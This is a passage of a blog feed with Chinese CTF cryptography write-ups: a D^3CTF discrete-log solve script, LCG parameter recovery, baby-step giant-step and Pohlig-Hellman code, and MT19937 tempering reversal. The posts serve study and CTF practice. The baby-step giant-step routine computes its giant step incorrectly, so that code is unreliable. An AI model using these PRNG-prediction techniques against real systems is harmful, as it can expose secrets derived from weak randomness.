class="number">1206480154572334732293699118673856031104906123554</span>10315808075494222588141707717382622649304416707083082596945889632243725304983056485785205520380297738493422061250742129127888238341527857566977572098044750319744459636919415157569012683762673605426564496697153xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">p = <span class="number">76690363131011946213452652559942001330069215655966537979569408116015163064</span>102321200576xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">q = <span class="number">9</span>1021224151656818244208716736217812503118228056187318636281925498956930242472205943728xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">C = [<span class="number">63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488</span>, <span class="number">9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718</span>, <span class="number">37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371</span>, <span class="number">1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957</span>, <span class="number">27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120</span>, <span class="number">27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224</span>, <span class="number">29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145</span>, <span class="number">33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823</span>, <span class="number">5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104</span>, <span class="number">61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964</span>, <span class="number">13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(C)):</span><br><span class="line">    m.append(BSGS(<span class="built_in">pow</span>(y,phi//e,n),<span class="built_in">pow</span>(C[i],phi//e,n),n))</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    flag = flag + m[<span class="built_in">len</span>(m)-<span class="number">1</span>-i]</span><br><span class="line">    flag *= e</span><br><span class="line">flag //= e</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="AliceWantFlag"><a href="#AliceWantFlag" class="headerlink" title="AliceWantFlag"></a>AliceWantFlag</h2><p>复现中，估计一周左右更新</p><h2 id="EasyCurve"><a href="#EasyCurve" class="headerlink" title="EasyCurve"></a>EasyCurve</h2><p>据说有非预期，学了佩尔方程然后回来更新</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-AntCTF-X-D-3CTF-39-s-crypto&quot;&gt;&lt;a href=&quot;#Wp-for-AntCTF-X-D-3CTF-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for AntCTF X D^3CTF&amp;#39;s crypto&quot;&gt;&lt;/a&gt;Wp for AntCTF X D^3CTF&amp;#39;s crypto&lt;/h1&gt;&lt;p&gt;我的格子和椭圆曲线实在是太烂了，奈何这次比赛基本都是（&lt;/p&gt;
&lt;p&gt;这次只贡献了1k分，我对不起V&amp;amp;N的师傅们呜呜呜&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>LCG</title>
    <link href="http://example.com/2021/03/04/LCG/"/>
    <id>http://example.com/2021/03/04/LCG/</id>
    <published>2021-03-04T01:33:32.000Z</published>
    <updated>2021-03-11T05:30:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h1><p>发现自己没有整过线性同余生成器的东西，今天专门来总解一下</p><span id="more"></span><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/">参考资料</a></p><h2 id="1、线性同余生成方法"><a href="#1、线性同余生成方法" class="headerlink" title="1、线性同余生成方法"></a>1、线性同余生成方法</h2><p>设A,B,M是一定常数，按照递推公式 $state_{i+1}&#x3D;(A\times state_i+B)\pmod{M}$ ，其中A称为乘数(multiplier)，B称为增量(increment)，M称为模数(modulus)</p><p>LCG的生成周期理论上应该是M，但大部分情况下会小于M，如果想要追求LCG的最大周期，应符合以下几个条件：</p><ul><li>A与B都是正整数</li><li>A、B、N[0]都比M要小</li><li>B与M互质</li><li>M的所有质因数都能整除A-1</li></ul><h2 id="2、攻击方法"><a href="#2、攻击方法" class="headerlink" title="2、攻击方法"></a>2、攻击方法</h2><p>我们把<code>state</code>均简称为<code>s</code></p><h3 id="1、B未知"><a href="#1、B未知" class="headerlink" title="1、B未知"></a>1、B未知</h3><p>只需获取中间的两个状态值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_1 = (s_0*A+B)%M</span><br></pre></td></tr></table></figure><p>显然 $B &#x3D; s_1 - s_0\times a\pmod{M}$</p><h3 id="2、A与B未知"><a href="#2、A与B未知" class="headerlink" title="2、A与B未知"></a>2、A与B未知</h3><p>只需获取中间的三个状态值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s_1 = (s_0*A+B)%M</span><br><span class="line">s_2 = (s_1*A+B)%M</span><br></pre></td></tr></table></figure><p>线性方程，解起来还是挺简单的</p><p>显然 $A &#x3D; \frac{s_2-s_1}{s_1-s_0}\pmod{M}$ ，于是就转化成了问题1了</p><h3 id="3、A、B、M都不知道-一问三不知"><a href="#3、A、B、M都不知道-一问三不知" class="headerlink" title="3、A、B、M都不知道 一问三不知"></a>3、A、B、M都不知道 <del>一问三不知</del></h3><p>如果获取中间的7个状态值，就很有可能能够成功，数论里：如果有几个随机数分别乘以n，那么这几个数的欧几里德算法(gcd)就很可能等于n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">114514</span></span><br><span class="line"><span class="built_in">print</span>(reduce(gcd, [randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x]))</span><br><span class="line"><span class="comment"># 114514</span></span><br></pre></td></tr></table></figure><p>所以我们可以利用这个性质，来尝试得到M，于是问题就被转化成了问题2</p><h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">lcg_attack</span>:</span><br><span class="line">    <span class="comment"># unknown B (increment)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgattack1</span>(<span class="params">self, states, modulus, multiplier</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(states)&lt;<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 2 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * multiplier) % modulus</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;multiplier&#x27;</span>:<span class="built_in">int</span>(multiplier), <span class="string">&#x27;increment&#x27;</span>:<span class="built_in">int</span>(increment), <span class="string">&#x27;modulus&#x27;</span>:<span class="built_in">int</span>(modulus)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unknown A (multiplier)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgattack2</span>(<span class="params">self, states, modulus</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(states)&lt;<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 3 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * inverse(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">        <span class="keyword">return</span> self.lcgattack1(states, modulus, multiplier)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unknown M (modulus)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lcgattack3</span>(<span class="params">self, states</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(states)&lt;<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 6 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">        zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">        modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">        <span class="keyword">return</span> self.lcgattack2(states, modulus)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;LCG&quot;&gt;&lt;a href=&quot;#LCG&quot; class=&quot;headerlink&quot; title=&quot;LCG&quot;&gt;&lt;/a&gt;LCG&lt;/h1&gt;&lt;p&gt;发现自己没有整过线性同余生成器的东西，今天专门来总解一下&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Discrete logarithm problem</title>
    <link href="http://example.com/2021/02/26/Discrete_logarithm_problem/"/>
    <id>http://example.com/2021/02/26/Discrete_logarithm_problem/</id>
    <published>2021-02-26T10:54:16.000Z</published>
    <updated>2021-03-11T01:17:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Discrete-logarithm-problem"><a href="#Discrete-logarithm-problem" class="headerlink" title="Discrete logarithm problem"></a>Discrete logarithm problem</h1><p>发现自己只是知道离散对数很难求，而且自己拿这玩意也没办法，专门来学一下<del>带老婆问题</del></p><span id="more"></span><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><h3 id="生成元"><a href="#生成元" class="headerlink" title="生成元"></a>生成元</h3><p>​在一个群 G 中，如果 g 是 G 的生成元，即所有 G 中的所有元素都可以被表示成 $y &#x3D; g^x$ ，此时的 x 我们称为 y 在 G 中的对数</p><h3 id="阶"><a href="#阶" class="headerlink" title="阶"></a>阶</h3><p>​设 $m\geq 1$ ， $gcd(a,m)&#x3D;1$ ，使得 $a^d&#x3D;1\pmod{m}$ 成立的最小正整数 d 称为 a 对模 m 的指数或者阶，我们一般将其记为 $\delta_m(a)$</p><p>​另：满足 $a^d&#x3D;1\pmod{m}$ 的<code>d</code>一定满足 $d\mid\varphi(m)$</p><h3 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h3><p>​当 $\delta_m(a)&#x3D;\varphi(m)$ 时，称 a 是模 m 的原根，简称 m 的原根</p><p>​只有 $m&#x3D;2,4,p^\alpha,2p^\alpha （p为奇素数，\alpha为正整数）$ 时，模 m 的剩余系存在原根（充要条件）</p><h2 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h2><h3 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h3><p><del>万物皆可暴力</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ForceDLP</span>(<span class="params">A,B,P</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(P):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(A,i,P)==B:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(i)</span><br></pre></td></tr></table></figure><h3 id="Baby-step-giant-step"><a href="#Baby-step-giant-step" class="headerlink" title="Baby-step giant-step"></a>Baby-step giant-step</h3><p><del>又称北上广深算法 带老婆去了北上广深（bushi</del></p><p>已知 $y &#x3D; g^x$ ，我们不妨假设 $x&#x3D;i\cdot m+j$ ，$m &#x3D; \sqrt{x}$ ，这样 $m^2&gt;n$ ，则这时候一定在<code>[0,m]</code>内存在一组<code>(i,j)</code>满足 $x&#x3D;i\cdot m+j$</p><p>具体做法就是：因为 $y &#x3D; g^x&#x3D;g^{i\cdot m+j}$ ， 则 $y\cdot (g^{-m})^i&#x3D;g^j$ ，所以我们首先枚举所有的<code>j</code>并存在一个盒子里，接着枚举<code>i</code>，如果能找到相同的结果，这说明我们得到了<code>(i,j)</code></p><p>据说</p><ul><li>每一次 j 的增加表示 “baby-step”，一次乘上 $g$</li><li>每一次 i 的增加表示 “giant-step”，一次乘上 $g^{-m}$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">g, y, p</span>):</span><br><span class="line">    m = <span class="built_in">int</span>(sqrt(p))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_square(p):</span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line">    S = &#123;<span class="built_in">pow</span>(g, j, p): j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m)&#125;</span><br><span class="line">    gs = <span class="built_in">pow</span>(g, inverse(m, p), p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> i * m + S[y]</span><br><span class="line">        y = y * gs % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="Pohlig-Hellman-Algorithm"><a href="#Pohlig-Hellman-Algorithm" class="headerlink" title="Pohlig-Hellman Algorithm"></a>Pohlig-Hellman Algorithm</h3><p>​这种方法适用于当<code>p-1</code>是个光滑数，因为<code>p</code>是个质数，所以 $\varphi(p)&#x3D;p-1$ ，根据唯一分解定理，我们可以假设 $p-1 &#x3D;q_1^{e_1}\cdot q_2^{e_2}\cdot q_3^{e_3}\cdots q_n^{e_n}$ ，我们首先分解 $p-1$ 得到因子列表<code>listq</code>，接着计算每一个因子对应的 $g^{\frac{p-1}{q^e}}$ 与 $h^{\frac{p-1}{q^e}}$ ，此时我们就可以较轻松地计算出满足 $({g^{\frac{p-1}{q^e}}})^x&#x3D;h^{\frac{p-1}{q^e}}\pmod{p}$ 的<code>x&#39;</code>，而此时的<code>x&#39;</code>也满足 $x’ &#x3D;x\pmod{p^e}$ ，那么我们可以通过许多的因子来得到许多的<code>x&#39;</code>，最后通过CRT即可找到我们最终要求的<code>x</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># g^x = h (mod p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PohligHellmanDLP</span>(<span class="params">g,h,p</span>):</span><br><span class="line">    Lq=pollard_rho_Factor(p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> reduce(<span class="keyword">lambda</span> x,y: x*y, Lq) == p-<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(Lq)</span><br><span class="line">    Lg=[<span class="built_in">pow</span>(g,(p-<span class="number">1</span>)//i,p) <span class="keyword">for</span> i <span class="keyword">in</span> Lq]</span><br><span class="line">    Lh=[<span class="built_in">pow</span>(h,(p-<span class="number">1</span>)//i,p) <span class="keyword">for</span> i <span class="keyword">in</span> Lq]</span><br><span class="line">    length=<span class="built_in">len</span>(Lq)</span><br><span class="line">    La=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        La.append(ForceDLP(Lg[i],Lh[i],p))</span><br><span class="line">    X=CRT(Lq,La)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g,X,p)==h:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found x! x =&quot;</span>,X)</span><br><span class="line">        <span class="keyword">return</span> X</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">g=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">h=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">start_time=time.time()</span><br><span class="line">x = PohligHellmanDLP(g,h,p)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;it takes&quot;</span>,time.time()-start_time,<span class="string">&quot;seconds&quot;</span>,)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Discrete-logarithm-problem&quot;&gt;&lt;a href=&quot;#Discrete-logarithm-problem&quot; class=&quot;headerlink&quot; title=&quot;Discrete logarithm problem&quot;&gt;&lt;/a&gt;Discrete logarithm problem&lt;/h1&gt;&lt;p&gt;发现自己只是知道离散对数很难求，而且自己拿这玩意也没办法，专门来学一下&lt;del&gt;带老婆问题&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>MT19937</title>
    <link href="http://example.com/2021/02/03/MT19937/"/>
    <id>http://example.com/2021/02/03/MT19937/</id>
    <published>2021-02-03T13:08:43.000Z</published>
    <updated>2021-03-11T01:16:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-study-for-MT19937"><a href="#A-study-for-MT19937" class="headerlink" title="A study for MT19937"></a>A study for MT19937</h1><p>寒假前被一个伪随机数卡了，终于有时间来看看</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如前文，不会就得学（悲</p><p><a href="https://badmonkey.site/archives/mt19937.html">参考博客</a></p><h2 id="MT19937"><a href="#MT19937" class="headerlink" title="MT19937"></a>MT19937</h2><p>​MT19937是许多语言的默认伪随机数生成器，其优点为：周期非常长（达到 $2^{19937}-1$ ）、在 $1\leq k\leq 623$ 的维度之间都可以均等分布、速度较快。</p><p>​MT19937算法主要分为三个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、基础的梅森旋转链</span><br><span class="line">2、输出处理算法（Tamper）</span><br><span class="line">3、旋转链的旋转算法（Twist）</span><br></pre></td></tr></table></figure><p>python中Random类采用MT19937算法，getrandbits(32)返回一个32位随机数，详细代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.mt = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(<span class="number">1812433253</span> * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_number</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">624</span>):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br></pre></td></tr></table></figure><h2 id="针对题目"><a href="#针对题目" class="headerlink" title="针对题目"></a>针对题目</h2><h3 id="1-逆向extract-number"><a href="#1-逆向extract-number" class="headerlink" title="1.逆向extract_number"></a>1.逆向extract_number</h3><p>我们发现这其中有两种操作是较难的，我们先来看这一种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ y &gt;&gt; <span class="number">11</span></span><br></pre></td></tr></table></figure><p>显而易见，这种操作并不会对<code>y</code>的高18位有任何影响，所以<code>y&#39;=y ^ y &gt;&gt; 11</code>的高18位就是<code>y</code>的高18位，而<code>y&#39;</code>接下来的18位正是<code>y</code>的高18位和<code>y</code>接下来的18位异或得来的，所以我们可以使用已知的高18位得到接下来的18位，同上，每操作一次我们就可得到<code>y</code>的18位，所以我们就能利用<code>y&#39;</code>通过有限的操作后复原之前的<code>y</code>，实现代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y1 = </span><br><span class="line">y = y1^y1&gt;&gt;<span class="number">11</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>//<span class="number">11</span>):</span><br><span class="line">    y = y1^(y&gt;&gt;<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(y1)</span><br></pre></td></tr></table></figure><p>分析完这一种，我们来看下一种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br></pre></td></tr></table></figure><p>类比上一种，<code>y&#39;</code>的低7位实际上就是<code>y^2636928640</code>的结果，可以轻松的获得<code>y</code>的低7位，我们可以将<code>y&lt;&lt;7&amp;2636928640</code>当做一个整体（也就是说掩码其实并没有实质性的作用），这样模仿前一种操作，复原代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">y1 = </span><br><span class="line">y = y1^ y1 &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">tmp = y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span> // <span class="number">7</span>):</span><br><span class="line">    y = tmp ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(y1)</span><br></pre></td></tr></table></figure><p>我们将左移和右移（带掩码与不带掩码）的复原代码整理如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 